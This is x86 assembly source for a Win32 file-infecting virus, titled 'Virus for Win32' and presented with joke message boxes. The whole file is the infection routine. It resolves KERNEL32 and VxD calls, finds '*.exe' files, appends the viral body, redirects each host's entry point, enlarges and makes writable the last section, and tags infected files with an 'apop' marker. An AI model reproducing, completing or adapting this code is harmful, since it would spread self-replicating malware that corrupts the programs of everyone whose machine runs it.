   .386
   locals
   jumps
   .model flat,stdcall
   L  equ     <LARGE>
   extrn      MessageBoxA:proc
   extrn      GetModuleHandleA:proc
   extrn      ExitProcess:proc
   .data
   popochka:
             pushad
             push ds
             push es
             push gs
             push fs
             call Vhod
   Vhod:
             pop ebp
             sub ebp, offset Vhod
             mov esi, [IB+ebp]
             lodsd
             cmp ax,'ZM'
             jne Exit

             add esi,38h
             lodsd
             add eax, [IB+ebp]
             xchg eax, esi
             lodsd
             cmp eax, 'EP'
             jne Exit
             add esi,7ch

             lodsd
             push eax
             lodsd
             mov [ImportSize+ebp], eax
             pop esi
             add esi, [IB+ebp]
             mov edx,esi
             mov ebx, esi
             add ebx, [ImportSize + ebp]

   FindK32:
             mov esi, [esi+0ch]
             add esi, [IB+ebp]
             mov [Kaka32+ebp], esi
             lodsd
             cmp eax, 'NREK'
             je short  find

             add edx, 14h
             mov esi, edx
             cmp esi, ebx
             jg short notfind
             jmp FindK32

   find:
             xchg esi, edx
             mov edx, [esi+10h]
             add edx, [IB+ebp]
             mov [ImportAdd+ebp], edx
             lodsd
             je short notfind

             xchg esi, eax
             add esi, [IB+ebp]
             mov edx, esi
             sub eax, eax
             mov ecx, [ImportSize+ebp]

   cicl:
             cmp dword ptr [edx], 0
             je short  notfind

             cmp byte ptr [edx+3],80h
             je short  dalee

             mov esi, [edx]
             push ecx
             add esi, [IB+ebp]
             inc esi
             inc esi
             lea edi, [OurModul+ebp]
             mov ecx, OurModulS
             rep cmpsb
             pop ecx
             je short  OllOk
   dalee:
             inc eax
             add edx, 4
             loop cicl

   OllOk:
             shl eax, 1
             mov ebx, [ImportAdd+ebp]
             add eax, ebx
             mov eax, [eax]

             push [Kaka32+ebp]
             call eax
             cmp eax,0
             jne short WeHaveKaka32
   notfind:
             mov eax,0bff70000h

   WeHaveKaka32:
             mov [Kaka32Add+ebp],eax
             mov eax, [RVA+ebp]
             mov [Return+ebp],eax
             mov esi, [Kaka32Add+ebp]
             add esi, 3ch
             lodsd
             add eax, [Kaka32Add+ebp]
             xchg esi, eax
             lodsd
             cmp ax, 'EP'
             je short PE
             jmp Exit
   PE:
             mov eax, [esi+74h]
             add eax, [Kaka32Add+ebp]
             add eax, 1ch
             xchg esi, eax
             lodsd
             add eax, [Kaka32Add+ebp]
             xchg esi, eax
             lodsd
             add eax, [Kaka32Add+ebp]
             mov [VxDAdd+ebp], eax

             mov eax, 00001a00h
             lea edx, [DTA+ebp]
             call VxDCall

             mov eax, 00004e00h
   FindFile:
             mov ecx, 0000000000111111h
             lea edx, [Maska+ebp]
             call VxDCall
             jc Exit

             mov eax, 00003d02h
             lea edx, [DTA+1eh+ebp]
             call VxDCall
             jc FindNext
             xchg eax,ebx

             mov eax, 00003f00h
             mov ecx, 00000070h
             lea edx, [Header+ebp]
             call VxDCall

             mov eax, 00004200h
             sub ecx, ecx
             sub edx, edx
             mov dx, word ptr [Header+3ch+ebp]
             mov [PEpointer+ebp],dx
             call VxDCall

             mov eax, 00003f00h
             mov ecx, 00000070h
             lea edx, [Header+ebp]
             call VxDCall

             cmp word ptr [Header+ebp], 'EP'
             jne CloseFile

             cmp dword ptr [Header+44h+ebp], 'apop'
             je  CloseFile

             mov ax, word ptr [Header+6+ebp]
             dec ax

             mov cx, 28h
             mul cx

             add ax, 18h
             add ax, word ptr [Header+14h+ebp]
             add ax, [PEpointer+ebp]
             mov [OBJpointer+ebp], ax

             sub ecx, ecx
             sub edx, edx
             xchg dx, ax
             mov eax, 00004200h
             call VxDCall

             mov eax, 00003f00h
             mov ecx, 00000028h
             lea edx, [Object+ebp]
             call VxDCall

             mov eax, dword ptr [Header+34h+ebp] ; eax=Image Base
             mov [IB+ebp],eax
             add eax, dword ptr [Header+28h+ebp] ; eax=Image Base+RVA
             mov [RVA+ebp], eax

             mov eax, 00004202h
             sub edx, edx
             sub ecx, ecx
             call VxDCall
             shl edx, 10h
             add eax, edx
             mov [filesize+ebp], eax

             mov eax, 00004000h
             mov ecx, VirSize
             lea edx, [popochka+ebp]
             call VxDCall
             jc CloseFile

             mov eax, [filesize+ebp]
             sub eax, dword ptr [OBJPoff+ebp]
             mov [delta+ebp], eax
             add eax, dword ptr [OBJRVA+ebp]

             mov dword ptr [Header+28h+ebp], eax ; New Entry RVA

             sub edx,edx
             mov eax, VirSize
             add eax, dword ptr [delta+ebp]
             mov ecx, dword ptr [Header+3ch+ebp]
             div ecx
             inc eax
             mul ecx
             mov dword ptr [OBJPsize+ebp], eax
             add eax, dword ptr [Header+1ch+ebp]
             mov dword ptr [Header+1ch+ebp], eax

             sub edx,edx
             mov eax, VirSize
             add eax, dword ptr [delta+ebp]
             mov ecx, dword ptr [Header+38h+ebp]
             div ecx
             inc eax
             mul ecx
             add eax, dword ptr [OBJRVA+ebp]
             mov dword ptr [Header+50h+ebp], eax
             mov dword ptr [Header+6ch+ebp], eax
             mov dword ptr [Header+44h+ebp], 'apop'

             mov edx, dword ptr [OBJVsize+ebp]
             cmp edx, dword ptr [OBJPsize+ebp]
             jg short Okk
             sub eax, dword ptr [OBJRVA+ebp]
             mov dword ptr [OBJVsize+ebp], eax
   Okk:
             mov eax, 20000000h
             or eax, 40000000h
             or eax, 80000000h
             mov dword ptr [OBJFlags+ebp], eax

             mov eax, 00004200h
             sub edx, edx
             sub ecx, ecx
             mov dx, word ptr [OBJpointer+ebp]
             call VxDCall

             mov eax, 00004000h
             mov ecx, 00000028h
             lea edx, [Object+ebp]
             call VxDCall

             mov eax, 00004200h
             sub edx, edx
             sub ecx, ecx
             mov dx, word ptr [PEpointer+ebp]
             call VxDCall

             mov eax, 00004000h
             mov ecx, 00000070h
             lea edx, [Header+ebp]
             call VxDCall

   CloseFile:
             mov eax, 00003e00h
             call VxDCall

   FindNext:
             mov eax, 00004f00h
             jmp FindFile
   Exit:
             cmp dword ptr [StartORno+ebp], 'zar1'
             pop fs
             pop gs
             pop es
             pop ds
             popad
             je EndOfFile
             db 68h
   Return    dd 0
             ret
   VxDCall:
             lea edi, [VxDEnd+ebp]
             push ecx
             push eax
             push 002a0010h
             push edi
             db 68h
   VxDAdd    dd 0
             ret
   VxDEnd:
             ret
   IB         dd 00400000h
   RVA        dd 0
   OurModul   db 'GetModuleHandleA',0
   Maska      db '*.exe',0
   VirSize    equ $ - popochka
   PEpointer  dw 0
   OBJpointer dw 0
   ImportSize dd 0
   ImportAdd  dd 0
   OurModulS  dd $ - OurModul
   Kaka32     dd 0   ; -> db 'KAKA32.dll'
   Kaka32Add  dd 0
   filesize   dd 0
   delta      dd 0
   Header     db 70h DUP (0)

   Object     db 08h DUP (0)
   OBJVsize   dd 0
   OBJRVA     dd 0
   OBJPsize   dd 0
   OBJPoff    dd 0
              db 0ch DUP (0)
   OBJFlags   dd 0

   DTA        db 44 DUP (0)
   StartORno  db '1raz'   ;Fraz - AVP call:)
   Pname      db 'Virus for Win32',0
   Ptext      db 'Do u wonna start virii?',0
   Ptext1     db 'It is Joke! :)',0
   .code
   begin:
              push L 4
              push offset Pname
              push offset Ptext
              push L 0
              call MessageBoxA
              jmp popochka
   EndOfFile:
              push L 40h
              push offset Pname
              push offset Ptext1
              push L 0
              call MessageBoxA
              push L 0
              call ExitProcess
              end begin
